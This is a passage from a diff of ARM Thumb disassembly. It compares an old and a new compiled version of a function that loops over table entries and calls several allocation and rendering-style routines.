+ 2232850:	1c15      	adds	r5, r2, #0
  2232852:	c203      	stmia	r2!, {r0, r1}
  2232854:	6818      	ldr	r0, [r3, #0]
- 2232856:	2601      	movs	r6, #1
- 2232858:	6010      	str	r0, [r2, #0]
- 223285a:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
- 223285c:	6801      	ldr	r1, [r0, #0]
- 223285e:	6888      	ldr	r0, [r1, #8]
- 2232860:	900e      	str	r0, [sp, #56]	@ 0x38
- 2232862:	68c8      	ldr	r0, [r1, #12]
- 2232864:	900f      	str	r0, [sp, #60]	@ 0x3c
+ 2232856:	6010      	str	r0, [r2, #0]
+ 2232858:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 223285a:	6801      	ldr	r1, [r0, #0]
+ 223285c:	6888      	ldr	r0, [r1, #8]
+ 223285e:	900c      	str	r0, [sp, #48]	@ 0x30
+ 2232860:	68c8      	ldr	r0, [r1, #12]
+ 2232862:	2101      	movs	r1, #1
+ 2232864:	900d      	str	r0, [sp, #52]	@ 0x34
  2232866:	2000      	movs	r0, #0
  2232868:	9099      	str	r0, [sp, #612]	@ 0x264
  223286a:	98bd      	ldr	r0, [sp, #756]	@ 0x2f4
- 223286c:	0080      	lsls	r0, r0, #2
- 223286e:	5839      	ldr	r1, [r7, r0]
- 2232870:	2901      	cmp	r1, #1
- 2232872:	dd1d      	ble.n	0x22328b0
- 2232874:	1c08      	adds	r0, r1, #0
- 2232876:	2210      	movs	r2, #16
- 2232878:	ab9a      	add	r3, sp, #616	@ 0x268
- 223287a:	4684      	mov	ip, r0
- 223287c:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
- 223287e:	6800      	ldr	r0, [r0, #0]
- 2232880:	1880      	adds	r0, r0, r2
- 2232882:	68c1      	ldr	r1, [r0, #12]
- 2232884:	6887      	ldr	r7, [r0, #8]
- 2232886:	980f      	ldr	r0, [sp, #60]	@ 0x3c
- 2232888:	9115      	str	r1, [sp, #84]	@ 0x54
- 223288a:	4041      	eors	r1, r0
- 223288c:	980e      	ldr	r0, [sp, #56]	@ 0x38
- 223288e:	4078      	eors	r0, r7
- 2232890:	4308      	orrs	r0, r1
- 2232892:	d102      	bne.n	0x223289a
- 2232894:	9810      	ldr	r0, [sp, #64]	@ 0x40
- 2232896:	6018      	str	r0, [r3, #0]
- 2232898:	e004      	b.n	0x22328a4
- 223289a:	9815      	ldr	r0, [sp, #84]	@ 0x54
- 223289c:	970e      	str	r7, [sp, #56]	@ 0x38
- 223289e:	900f      	str	r0, [sp, #60]	@ 0x3c
- 22328a0:	601e      	str	r6, [r3, #0]
- 22328a2:	9610      	str	r6, [sp, #64]	@ 0x40
- 22328a4:	1c76      	adds	r6, r6, #1
- 22328a6:	4660      	mov	r0, ip
- 22328a8:	3210      	adds	r2, #16
- 22328aa:	1d1b      	adds	r3, r3, #4
- 22328ac:	4286      	cmp	r6, r0
- 22328ae:	dbe5      	blt.n	0x223287c
- 22328b0:	2000      	movs	r0, #0
- 22328b2:	9006      	str	r0, [sp, #24]
- 22328b4:	6920      	ldr	r0, [r4, #16]
- 22328b6:	2800      	cmp	r0, #0
- 22328b8:	dc00      	bgt.n	0x22328bc
- 22328ba:	e0e9      	b.n	0x2232a90
- 22328bc:	a899      	add	r0, sp, #612	@ 0x264
- 22328be:	9008      	str	r0, [sp, #32]
- 22328c0:	98bd      	ldr	r0, [sp, #756]	@ 0x2f4
- 22328c2:	9e06      	ldr	r6, [sp, #24]
- 22328c4:	9007      	str	r0, [sp, #28]
- 22328c6:	3058      	adds	r0, #88	@ 0x58
- 22328c8:	9007      	str	r0, [sp, #28]
- 22328ca:	9805      	ldr	r0, [sp, #20]
- 22328cc:	9907      	ldr	r1, [sp, #28]
- 22328ce:	6c80      	ldr	r0, [r0, #72]	@ 0x48
- 22328d0:	f5d8 fc8c 	bl	0x200b1ec
- 22328d4:	9013      	str	r0, [sp, #76]	@ 0x4c
- 22328d6:	20ff      	movs	r0, #255	@ 0xff
- 22328d8:	2166      	movs	r1, #102	@ 0x66
- 22328da:	f5f0 ff59 	bl	0x2023790
- 22328de:	9012      	str	r0, [sp, #72]	@ 0x48
- 22328e0:	20ff      	movs	r0, #255	@ 0xff
- 22328e2:	2166      	movs	r1, #102	@ 0x66
- 22328e4:	f5f0 ff54 	bl	0x2023790
- 22328e8:	1c07      	adds	r7, r0, #0
- 22328ea:	20ff      	movs	r0, #255	@ 0xff
- 22328ec:	2166      	movs	r1, #102	@ 0x66
- 22328ee:	f5f0 ff4f 	bl	0x2023790
- 22328f2:	900d      	str	r0, [sp, #52]	@ 0x34
- 22328f4:	98bd      	ldr	r0, [sp, #756]	@ 0x2f4
- 22328f6:	2800      	cmp	r0, #0
- 22328f8:	d004      	beq.n	0x2232904
- 22328fa:	2801      	cmp	r0, #1
- 22328fc:	d015      	beq.n	0x223292a
- 22328fe:	2802      	cmp	r0, #2
- 2232900:	d023      	beq.n	0x223294a
- 2232902:	e03f      	b.n	0x2232984
- 2232904:	6aa1      	ldr	r1, [r4, #40]	@ 0x28
- 2232906:	6b60      	ldr	r0, [r4, #52]	@ 0x34
- 2232908:	6809      	ldr	r1, [r1, #0]
- 223290a:	1989      	adds	r1, r1, r6
- 223290c:	6849      	ldr	r1, [r1, #4]
- 223290e:	f5d8 fc6d 	bl	0x200b1ec
- 2232912:	9011      	str	r0, [sp, #68]	@ 0x44
- 2232914:	2001      	movs	r0, #1
- 2232916:	9000      	str	r0, [sp, #0]
- 2232918:	2002      	movs	r0, #2
- 223291a:	9001      	str	r0, [sp, #4]
- 223291c:	9a11      	ldr	r2, [sp, #68]	@ 0x44
- 223291e:	1c28      	adds	r0, r5, #0
- 2232920:	2101      	movs	r1, #1
- 2232922:	2300      	movs	r3, #0
- 2232924:	f5d8 fdb2 	bl	0x200b48c
- 2232928:	e02c      	b.n	0x2232984
- 223292a:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
- 223292c:	2166      	movs	r1, #102	@ 0x66
- 223292e:	6800      	ldr	r0, [r0, #0]
- 2232930:	1980      	adds	r0, r0, r6
- 2232932:	6840      	ldr	r0, [r0, #4]
- 2232934:	900c      	str	r0, [sp, #48]	@ 0x30
- 2232936:	20ff      	movs	r0, #255	@ 0xff
- 2232938:	f5f0 ff2a 	bl	0x2023790
- 223293c:	9011      	str	r0, [sp, #68]	@ 0x44
- 223293e:	9a0c      	ldr	r2, [sp, #48]	@ 0x30
- 2232940:	1c28      	adds	r0, r5, #0
- 2232942:	2101      	movs	r1, #1
- 2232944:	f5d9 fccc 	bl	0x200c2e0
- 2232948:	e01c      	b.n	0x2232984
- 223294a:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
- 223294c:	2166      	movs	r1, #102	@ 0x66
- 223294e:	6800      	ldr	r0, [r0, #0]
- 2232950:	1980      	adds	r0, r0, r6
- 2232952:	6840      	ldr	r0, [r0, #4]
- 2232954:	900b      	str	r0, [sp, #44]	@ 0x2c
- 2232956:	20ff      	movs	r0, #255	@ 0xff
- 2232958:	f5f0 ff1a 	bl	0x2023790
- 223295c:	9011      	str	r0, [sp, #68]	@ 0x44
- 223295e:	980b      	ldr	r0, [sp, #44]	@ 0x2c
- 2232960:	2166      	movs	r1, #102	@ 0x66
- 2232962:	aa19      	add	r2, sp, #100	@ 0x64
- 2232964:	f5d8 fc86 	bl	0x200b274
- 2232968:	9811      	ldr	r0, [sp, #68]	@ 0x44
- 223296a:	a919      	add	r1, sp, #100	@ 0x64
- 223296c:	f5f1 f9dc 	bl	0x2023d28
- 2232970:	2001      	movs	r0, #1
- 2232972:	9000      	str	r0, [sp, #0]
- 2232974:	2002      	movs	r0, #2
- 2232976:	9001      	str	r0, [sp, #4]
- 2232978:	9a11      	ldr	r2, [sp, #68]	@ 0x44
- 223297a:	1c28      	adds	r0, r5, #0
- 223297c:	2101      	movs	r1, #1
- 223297e:	2300      	movs	r3, #0
- 2232980:	f5d8 fd84 	bl	0x200b48c
- 2232984:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
- 2232986:	6800      	ldr	r0, [r0, #0]
- 2232988:	1981      	adds	r1, r0, r6
- 223298a:	6888      	ldr	r0, [r1, #8]
- 223298c:	9009      	str	r0, [sp, #36]	@ 0x24
- 223298e:	68c8      	ldr	r0, [r1, #12]
- 2232990:	900a      	str	r0, [sp, #40]	@ 0x28
- 2232992:	9809      	ldr	r0, [sp, #36]	@ 0x24
- 2232994:	990a      	ldr	r1, [sp, #40]	@ 0x28
- 2232996:	f001 fcf9 	bl	0x223438c
- 223299a:	1c03      	adds	r3, r0, #0
- 223299c:	2000      	movs	r0, #0
- 223299e:	9000      	str	r0, [sp, #0]
- 22329a0:	2001      	movs	r0, #1
- 22329a2:	9001      	str	r0, [sp, #4]
- 22329a4:	980d      	ldr	r0, [sp, #52]	@ 0x34
- 22329a6:	9909      	ldr	r1, [sp, #36]	@ 0x24
- 22329a8:	9a0a      	ldr	r2, [sp, #40]	@ 0x28
- 22329aa:	f5f1 f813 	bl	0x20239d4
- 22329ae:	2001      	movs	r0, #1
- 22329b0:	9000      	str	r0, [sp, #0]
- 22329b2:	9908      	ldr	r1, [sp, #32]
- 22329b4:	9812      	ldr	r0, [sp, #72]	@ 0x48
- 22329b6:	6809      	ldr	r1, [r1, #0]
- 22329b8:	2202      	movs	r2, #2
- 22329ba:	1c49      	adds	r1, r1, #1
- 22329bc:	2301      	movs	r3, #1
- 22329be:	f5f0 ff6f 	bl	0x20238a0
- 22329c2:	2001      	movs	r0, #1
- 22329c4:	9000      	str	r0, [sp, #0]
- 22329c6:	2002      	movs	r0, #2
- 22329c8:	2100      	movs	r1, #0
- 22329ca:	9001      	str	r0, [sp, #4]
- 22329cc:	9a12      	ldr	r2, [sp, #72]	@ 0x48
- 22329ce:	1c28      	adds	r0, r5, #0
- 22329d0:	1c0b      	adds	r3, r1, #0
- 22329d2:	f5d8 fd5b 	bl	0x200b48c
- 22329d6:	9a13      	ldr	r2, [sp, #76]	@ 0x4c
- 22329d8:	1c28      	adds	r0, r5, #0
- 22329da:	1c39      	adds	r1, r7, #0
- 22329dc:	f5d9 fcd4 	bl	0x200c388
- 22329e0:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
- 22329e2:	1c3a      	adds	r2, r7, #0
- 22329e4:	6880      	ldr	r0, [r0, #8]
- 22329e6:	0101      	lsls	r1, r0, #4
- 22329e8:	9806      	ldr	r0, [sp, #24]
- 22329ea:	4341      	muls	r1, r0
- 22329ec:	9100      	str	r1, [sp, #0]
- 22329ee:	20ff      	movs	r0, #255	@ 0xff
- 22329f0:	9001      	str	r0, [sp, #4]
- 22329f2:	482d      	ldr	r0, [pc, #180]	@ (0x2232aa8)
- 22329f4:	2100      	movs	r1, #0
- 22329f6:	9002      	str	r0, [sp, #8]
- 22329f8:	2000      	movs	r0, #0
- 22329fa:	9003      	str	r0, [sp, #12]
- 22329fc:	9814      	ldr	r0, [sp, #80]	@ 0x50
- 22329fe:	1c0b      	adds	r3, r1, #0
- 2232a00:	f5ea fec4 	bl	0x201d78c
- 2232a04:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
- 2232a06:	6880      	ldr	r0, [r0, #8]
- 2232a08:	2802      	cmp	r0, #2
- 2232a0a:	d124      	bne.n	0x2232a56
- 2232a0c:	98be      	ldr	r0, [sp, #760]	@ 0x2f8
- 2232a0e:	2800      	cmp	r0, #0
- 2232a10:	d021      	beq.n	0x2232a56
- 2232a12:	2001      	movs	r0, #1
- 2232a14:	9000      	str	r0, [sp, #0]
- 2232a16:	2002      	movs	r0, #2
- 2232a18:	9001      	str	r0, [sp, #4]
- 2232a1a:	9a0d      	ldr	r2, [sp, #52]	@ 0x34
- 2232a1c:	1c28      	adds	r0, r5, #0
- 2232a1e:	2102      	movs	r1, #2
- 2232a20:	2300      	movs	r3, #0
- 2232a22:	f5d8 fd33 	bl	0x200b48c
- 2232a26:	9abe      	ldr	r2, [sp, #760]	@ 0x2f8
- 2232a28:	1c28      	adds	r0, r5, #0
- 2232a2a:	1c39      	adds	r1, r7, #0
- 2232a2c:	f5d9 fcac 	bl	0x200c388
- 2232a30:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
- 2232a32:	1c3a      	adds	r2, r7, #0
- 2232a34:	6880      	ldr	r0, [r0, #8]
- 2232a36:	2310      	movs	r3, #16
- 2232a38:	0101      	lsls	r1, r0, #4
- 2232a3a:	9806      	ldr	r0, [sp, #24]
- 2232a3c:	4341      	muls	r1, r0
- 2232a3e:	3110      	adds	r1, #16
- 2232a40:	9100      	str	r1, [sp, #0]
- 2232a42:	20ff      	movs	r0, #255	@ 0xff
- 2232a44:	9001      	str	r0, [sp, #4]
- 2232a46:	4818      	ldr	r0, [pc, #96]	@ (0x2232aa8)
- 2232a48:	2100      	movs	r1, #0
- 2232a4a:	9002      	str	r0, [sp, #8]
- 2232a4c:	2000      	movs	r0, #0
- 2232a4e:	9003      	str	r0, [sp, #12]
- 2232a50:	9814      	ldr	r0, [sp, #80]	@ 0x50
- 2232a52:	f5ea fe9b 	bl	0x201d78c
- 2232a56:	9813      	ldr	r0, [sp, #76]	@ 0x4c
- 2232a58:	f5f0 feb0 	bl	0x20237bc
- 2232a5c:	9812      	ldr	r0, [sp, #72]	@ 0x48
- 2232a5e:	f5f0 fead 	bl	0x20237bc
- 2232a62:	9811      	ldr	r0, [sp, #68]	@ 0x44
- 2232a64:	f5f0 feaa 	bl	0x20237bc
- 2232a68:	1c38      	adds	r0, r7, #0
- 2232a6a:	f5f0 fea7 	bl	0x20237bc
- 2232a6e:	980d      	ldr	r0, [sp, #52]	@ 0x34
- 2232a70:	f5f0 fea4 	bl	0x20237bc
- 2232a74:	1c28      	adds	r0, r5, #0
- 2232a76:	f5d9 fcd1 	bl	0x200c41c
- 2232a7a:	9808      	ldr	r0, [sp, #32]
- 2232a7c:	6921      	ldr	r1, [r4, #16]
- 2232a7e:	1d00      	adds	r0, r0, #4
- 2232a80:	9008      	str	r0, [sp, #32]
- 2232a82:	9806      	ldr	r0, [sp, #24]
- 2232a84:	3610      	adds	r6, #16
- 2232a86:	1c40      	adds	r0, r0, #1
- 2232a88:	9006      	str	r0, [sp, #24]
- 2232a8a:	4288      	cmp	r0, r1
- 2232a8c:	da00      	bge.n	0x2232a90
- 2232a8e:	e71c      	b.n	0x22328ca
- 2232a90:	9814      	ldr	r0, [sp, #80]	@ 0x50
- 2232a92:	f5e7 ff87 	bl	0x201a9a4
- 2232a96:	1c28      	adds	r0, r5, #0
- 2232a98:	f5d8 fcaa 	bl	0x200b3f0
- 2232a9c:	b07f      	add	sp, #508	@ 0x1fc
- 2232a9e:	b038      	add	sp, #224	@ 0xe0
- 2232aa0:	bdf0      	pop	{r4, r5, r6, r7, pc}
- 2232aa2:	46c0      	nop			@ (mov r8, r8)
- 2232aa4:	88f8      	ldrh	r0, [r7, #6]
- 2232aa6:	0224      	lsls	r4, r4, #8
- 2232aa8:	0d00      	lsrs	r0, r0, #20
- 2232aaa:	000f      	movs	r7, r1
+ 223286c:	0086      	lsls	r6, r0, #2
+ 223286e:	59a8      	ldr	r0, [r5, r6]
+ 2232870:	2801      	cmp	r0, #1
+ 2232872:	dd1b      	ble.n	0x22328ac
+ 2232874:	2210      	movs	r2, #16
+ 2232876:	ab9a      	add	r3, sp, #616	@ 0x268
+ 2232878:	4684      	mov	ip, r0
+ 223287a:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 223287c:	6800      	ldr	r0, [r0, #0]
+ 223287e:	1885      	adds	r5, r0, r2
+ 2232880:	68ef      	ldr	r7, [r5, #12]
+ 2232882:	68a8      	ldr	r0, [r5, #8]
+ 2232884:	9d0d      	ldr	r5, [sp, #52]	@ 0x34
+ 2232886:	1c3e      	adds	r6, r7, #0
+ 2232888:	406e      	eors	r6, r5
+ 223288a:	9d0c      	ldr	r5, [sp, #48]	@ 0x30
+ 223288c:	4045      	eors	r5, r0
+ 223288e:	4335      	orrs	r5, r6
+ 2232890:	d102      	bne.n	0x2232898
+ 2232892:	980e      	ldr	r0, [sp, #56]	@ 0x38
+ 2232894:	6018      	str	r0, [r3, #0]
+ 2232896:	e003      	b.n	0x22328a0
+ 2232898:	900c      	str	r0, [sp, #48]	@ 0x30
+ 223289a:	970d      	str	r7, [sp, #52]	@ 0x34
+ 223289c:	6019      	str	r1, [r3, #0]
+ 223289e:	910e      	str	r1, [sp, #56]	@ 0x38
+ 22328a0:	1c49      	adds	r1, r1, #1
+ 22328a2:	4660      	mov	r0, ip
+ 22328a4:	3210      	adds	r2, #16
+ 22328a6:	1d1b      	adds	r3, r3, #4
+ 22328a8:	4281      	cmp	r1, r0
+ 22328aa:	dbe6      	blt.n	0x223287a
+ 22328ac:	6920      	ldr	r0, [r4, #16]
+ 22328ae:	2600      	movs	r6, #0
+ 22328b0:	2800      	cmp	r0, #0
+ 22328b2:	dc00      	bgt.n	0x22328b6
+ 22328b4:	e0e8      	b.n	0x2232a88
+ 22328b6:	a899      	add	r0, sp, #612	@ 0x264
+ 22328b8:	9007      	str	r0, [sp, #28]
+ 22328ba:	98bd      	ldr	r0, [sp, #756]	@ 0x2f4
+ 22328bc:	1c35      	adds	r5, r6, #0
+ 22328be:	9006      	str	r0, [sp, #24]
+ 22328c0:	3058      	adds	r0, #88	@ 0x58
+ 22328c2:	9006      	str	r0, [sp, #24]
+ 22328c4:	9805      	ldr	r0, [sp, #20]
+ 22328c6:	9906      	ldr	r1, [sp, #24]
+ 22328c8:	6c80      	ldr	r0, [r0, #72]	@ 0x48
+ 22328ca:	f5d8 fc8f 	bl	0x200b1ec
+ 22328ce:	9013      	str	r0, [sp, #76]	@ 0x4c
+ 22328d0:	20ff      	movs	r0, #255	@ 0xff
+ 22328d2:	2166      	movs	r1, #102	@ 0x66
+ 22328d4:	f5f0 ff5c 	bl	0x2023790
+ 22328d8:	9012      	str	r0, [sp, #72]	@ 0x48
+ 22328da:	20ff      	movs	r0, #255	@ 0xff
+ 22328dc:	2166      	movs	r1, #102	@ 0x66
+ 22328de:	f5f0 ff57 	bl	0x2023790
+ 22328e2:	9010      	str	r0, [sp, #64]	@ 0x40
+ 22328e4:	20ff      	movs	r0, #255	@ 0xff
+ 22328e6:	2166      	movs	r1, #102	@ 0x66
+ 22328e8:	f5f0 ff52 	bl	0x2023790
+ 22328ec:	1c07      	adds	r7, r0, #0
+ 22328ee:	98bd      	ldr	r0, [sp, #756]	@ 0x2f4
+ 22328f0:	2800      	cmp	r0, #0
+ 22328f2:	d004      	beq.n	0x22328fe
+ 22328f4:	2801      	cmp	r0, #1
+ 22328f6:	d00b      	beq.n	0x2232910
+ 22328f8:	2802      	cmp	r0, #2
+ 22328fa:	d01b      	beq.n	0x2232934
+ 22328fc:	e02d      	b.n	0x223295a
+ 22328fe:	6aa1      	ldr	r1, [r4, #40]	@ 0x28
+ 2232900:	6b60      	ldr	r0, [r4, #52]	@ 0x34
+ 2232902:	6809      	ldr	r1, [r1, #0]
+ 2232904:	1949      	adds	r1, r1, r5
+ 2232906:	6849      	ldr	r1, [r1, #4]
+ 2232908:	f5d8 fc70 	bl	0x200b1ec
+ 223290c:	9011      	str	r0, [sp, #68]	@ 0x44
+ 223290e:	e024      	b.n	0x223295a
+ 2232910:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 2232912:	2166      	movs	r1, #102	@ 0x66
+ 2232914:	6800      	ldr	r0, [r0, #0]
+ 2232916:	1940      	adds	r0, r0, r5
+ 2232918:	6840      	ldr	r0, [r0, #4]
+ 223291a:	900b      	str	r0, [sp, #44]	@ 0x2c
+ 223291c:	20ff      	movs	r0, #255	@ 0xff
+ 223291e:	f5f0 ff37 	bl	0x2023790
+ 2232922:	2101      	movs	r1, #1
+ 2232924:	9100      	str	r1, [sp, #0]
+ 2232926:	990b      	ldr	r1, [sp, #44]	@ 0x2c
+ 2232928:	2202      	movs	r2, #2
+ 223292a:	2301      	movs	r3, #1
+ 223292c:	9011      	str	r0, [sp, #68]	@ 0x44
+ 223292e:	f5f0 ffb7 	bl	0x20238a0
+ 2232932:	e012      	b.n	0x223295a
+ 2232934:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 2232936:	2166      	movs	r1, #102	@ 0x66
+ 2232938:	6800      	ldr	r0, [r0, #0]
+ 223293a:	1940      	adds	r0, r0, r5
+ 223293c:	6840      	ldr	r0, [r0, #4]
+ 223293e:	900a      	str	r0, [sp, #40]	@ 0x28
+ 2232940:	20ff      	movs	r0, #255	@ 0xff
+ 2232942:	f5f0 ff25 	bl	0x2023790
+ 2232946:	9011      	str	r0, [sp, #68]	@ 0x44
+ 2232948:	980a      	ldr	r0, [sp, #40]	@ 0x28
+ 223294a:	2166      	movs	r1, #102	@ 0x66
+ 223294c:	aa19      	add	r2, sp, #100	@ 0x64
+ 223294e:	f5d8 fc91 	bl	0x200b274
+ 2232952:	9811      	ldr	r0, [sp, #68]	@ 0x44
+ 2232954:	a919      	add	r1, sp, #100	@ 0x64
+ 2232956:	f5f1 f9e7 	bl	0x2023d28
+ 223295a:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 223295c:	6800      	ldr	r0, [r0, #0]
+ 223295e:	1941      	adds	r1, r0, r5
+ 2232960:	6888      	ldr	r0, [r1, #8]
+ 2232962:	9008      	str	r0, [sp, #32]
+ 2232964:	68c8      	ldr	r0, [r1, #12]
+ 2232966:	9009      	str	r0, [sp, #36]	@ 0x24
+ 2232968:	9808      	ldr	r0, [sp, #32]
+ 223296a:	9909      	ldr	r1, [sp, #36]	@ 0x24
+ 223296c:	f001 fd0a 	bl	0x2234384
+ 2232970:	1c03      	adds	r3, r0, #0
+ 2232972:	2000      	movs	r0, #0
+ 2232974:	9000      	str	r0, [sp, #0]
+ 2232976:	2001      	movs	r0, #1
+ 2232978:	9001      	str	r0, [sp, #4]
+ 223297a:	9908      	ldr	r1, [sp, #32]
+ 223297c:	9a09      	ldr	r2, [sp, #36]	@ 0x24
+ 223297e:	1c38      	adds	r0, r7, #0
+ 2232980:	f5f1 f828 	bl	0x20239d4
+ 2232984:	2001      	movs	r0, #1
+ 2232986:	9000      	str	r0, [sp, #0]
+ 2232988:	9907      	ldr	r1, [sp, #28]
+ 223298a:	9812      	ldr	r0, [sp, #72]	@ 0x48
+ 223298c:	6809      	ldr	r1, [r1, #0]
+ 223298e:	2202      	movs	r2, #2
+ 2232990:	1c49      	adds	r1, r1, #1
+ 2232992:	2301      	movs	r3, #1
+ 2232994:	f5f0 ff84 	bl	0x20238a0
+ 2232998:	2001      	movs	r0, #1
+ 223299a:	9000      	str	r0, [sp, #0]
+ 223299c:	2002      	movs	r0, #2
+ 223299e:	9001      	str	r0, [sp, #4]
+ 22329a0:	2100      	movs	r1, #0
+ 22329a2:	980f      	ldr	r0, [sp, #60]	@ 0x3c
+ 22329a4:	9a12      	ldr	r2, [sp, #72]	@ 0x48
+ 22329a6:	1c0b      	adds	r3, r1, #0
+ 22329a8:	f5d8 fd70 	bl	0x200b48c
+ 22329ac:	2001      	movs	r0, #1
+ 22329ae:	9000      	str	r0, [sp, #0]
+ 22329b0:	2002      	movs	r0, #2
+ 22329b2:	9001      	str	r0, [sp, #4]
+ 22329b4:	980f      	ldr	r0, [sp, #60]	@ 0x3c
+ 22329b6:	9a11      	ldr	r2, [sp, #68]	@ 0x44
+ 22329b8:	2101      	movs	r1, #1
+ 22329ba:	2300      	movs	r3, #0
+ 22329bc:	f5d8 fd66 	bl	0x200b48c
+ 22329c0:	980f      	ldr	r0, [sp, #60]	@ 0x3c
+ 22329c2:	9910      	ldr	r1, [sp, #64]	@ 0x40
+ 22329c4:	9a13      	ldr	r2, [sp, #76]	@ 0x4c
+ 22329c6:	f5d9 fcdf 	bl	0x200c388
+ 22329ca:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 22329cc:	2100      	movs	r1, #0
+ 22329ce:	6880      	ldr	r0, [r0, #8]
+ 22329d0:	9a10      	ldr	r2, [sp, #64]	@ 0x40
+ 22329d2:	0100      	lsls	r0, r0, #4
+ 22329d4:	4370      	muls	r0, r6
+ 22329d6:	9000      	str	r0, [sp, #0]
+ 22329d8:	20ff      	movs	r0, #255	@ 0xff
+ 22329da:	9001      	str	r0, [sp, #4]
+ 22329dc:	4830      	ldr	r0, [pc, #192]	@ (0x2232aa0)
+ 22329de:	1c0b      	adds	r3, r1, #0
+ 22329e0:	9002      	str	r0, [sp, #8]
+ 22329e2:	2000      	movs	r0, #0
+ 22329e4:	9003      	str	r0, [sp, #12]
+ 22329e6:	9814      	ldr	r0, [sp, #80]	@ 0x50
+ 22329e8:	f5ea fed0 	bl	0x201d78c
+ 22329ec:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 22329ee:	6880      	ldr	r0, [r0, #8]
+ 22329f0:	2802      	cmp	r0, #2
+ 22329f2:	d12e      	bne.n	0x2232a52
+ 22329f4:	2000      	movs	r0, #0
+ 22329f6:	1c39      	adds	r1, r7, #0
+ 22329f8:	1c02      	adds	r2, r0, #0
+ 22329fa:	f5d0 f9bf 	bl	0x2002d7c
+ 22329fe:	9015      	str	r0, [sp, #84]	@ 0x54
+ 2232a00:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 2232a02:	2100      	movs	r1, #0
+ 2232a04:	6880      	ldr	r0, [r0, #8]
+ 2232a06:	1c3a      	adds	r2, r7, #0
+ 2232a08:	0100      	lsls	r0, r0, #4
+ 2232a0a:	4370      	muls	r0, r6
+ 2232a0c:	3010      	adds	r0, #16
+ 2232a0e:	9000      	str	r0, [sp, #0]
+ 2232a10:	20ff      	movs	r0, #255	@ 0xff
+ 2232a12:	9001      	str	r0, [sp, #4]
+ 2232a14:	4822      	ldr	r0, [pc, #136]	@ (0x2232aa0)
+ 2232a16:	2310      	movs	r3, #16
+ 2232a18:	9002      	str	r0, [sp, #8]
+ 2232a1a:	2000      	movs	r0, #0
+ 2232a1c:	9003      	str	r0, [sp, #12]
+ 2232a1e:	9814      	ldr	r0, [sp, #80]	@ 0x50
+ 2232a20:	f5ea feb4 	bl	0x201d78c
+ 2232a24:	98be      	ldr	r0, [sp, #760]	@ 0x2f8
+ 2232a26:	2800      	cmp	r0, #0
+ 2232a28:	d013      	beq.n	0x2232a52
+ 2232a2a:	6aa0      	ldr	r0, [r4, #40]	@ 0x28
+ 2232a2c:	9b15      	ldr	r3, [sp, #84]	@ 0x54
+ 2232a2e:	6880      	ldr	r0, [r0, #8]
+ 2232a30:	3310      	adds	r3, #16
+ 2232a32:	0100      	lsls	r0, r0, #4
+ 2232a34:	4370      	muls	r0, r6
+ 2232a36:	3010      	adds	r0, #16
+ 2232a38:	9000      	str	r0, [sp, #0]
+ 2232a3a:	20ff      	movs	r0, #255	@ 0xff
+ 2232a3c:	9001      	str	r0, [sp, #4]
+ 2232a3e:	4818      	ldr	r0, [pc, #96]	@ (0x2232aa0)
+ 2232a40:	9abe      	ldr	r2, [sp, #760]	@ 0x2f8
+ 2232a42:	9002      	str	r0, [sp, #8]
+ 2232a44:	2000      	movs	r0, #0
+ 2232a46:	9003      	str	r0, [sp, #12]
+ 2232a48:	9814      	ldr	r0, [sp, #80]	@ 0x50
+ 2232a4a:	2100      	movs	r1, #0
+ 2232a4c:	9315      	str	r3, [sp, #84]	@ 0x54
+ 2232a4e:	f5ea fe9d 	bl	0x201d78c
+ 2232a52:	9813      	ldr	r0, [sp, #76]	@ 0x4c
+ 2232a54:	f5f0 feb2 	bl	0x20237bc
+ 2232a58:	9812      	ldr	r0, [sp, #72]	@ 0x48
+ 2232a5a:	f5f0 feaf 	bl	0x20237bc
+ 2232a5e:	9811      	ldr	r0, [sp, #68]	@ 0x44
+ 2232a60:	f5f0 feac 	bl	0x20237bc
+ 2232a64:	9810      	ldr	r0, [sp, #64]	@ 0x40
+ 2232a66:	f5f0 fea9 	bl	0x20237bc
+ 2232a6a:	1c38      	adds	r0, r7, #0
+ 2232a6c:	f5f0 fea6 	bl	0x20237bc
+ 2232a70:	980f      	ldr	r0, [sp, #60]	@ 0x3c
+ 2232a72:	f5d9 fcd3 	bl	0x200c41c
+ 2232a76:	9807      	ldr	r0, [sp, #28]
+ 2232a78:	1c76      	adds	r6, r6, #1
+ 2232a7a:	1d00      	adds	r0, r0, #4
+ 2232a7c:	9007      	str	r0, [sp, #28]
+ 2232a7e:	6920      	ldr	r0, [r4, #16]
+ 2232a80:	3510      	adds	r5, #16
+ 2232a82:	4286      	cmp	r6, r0
+ 2232a84:	da00      	bge.n	0x2232a88
+ 2232a86:	e71d      	b.n	0x22328c4
+ 2232a88:	9814      	ldr	r0, [sp, #80]	@ 0x50
+ 2232a8a:	f5e7 ff8b 	bl	0x201a9a4
+ 2232a8e:	980f      	ldr	r0, [sp, #60]	@ 0x3c
+ 2232a90:	f5d8 fcae 	bl	0x200b3f0
+ 2232a94:	b07f      	add	sp, #508	@ 0x1fc
+ 2232a96:	b038      	add	sp, #224	@ 0xe0
+ 2232a98:	bdf0      	pop	{r4, r5, r6, r7, pc}
+ 2232a9a:	46c0      	nop			@ (mov r8, r8)
+ 2232a9c:	88f0      	ldrh	r0, [r6, #6]
+ 2232a9e:	0224      	lsls	r4, r4, #8
+ 2232aa0:	0d00      	lsrs	r0, r0, #20
+ 2232aa2:	000f      	movs	r7, r1
+ 2232aa4:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
+ 2232aa6:	b086      	sub	sp, #24
+ 2232aa8:	1c06      	adds	r6, r0, #0
+ 2232aaa:	9005      	str	r0, [sp, #20]
"
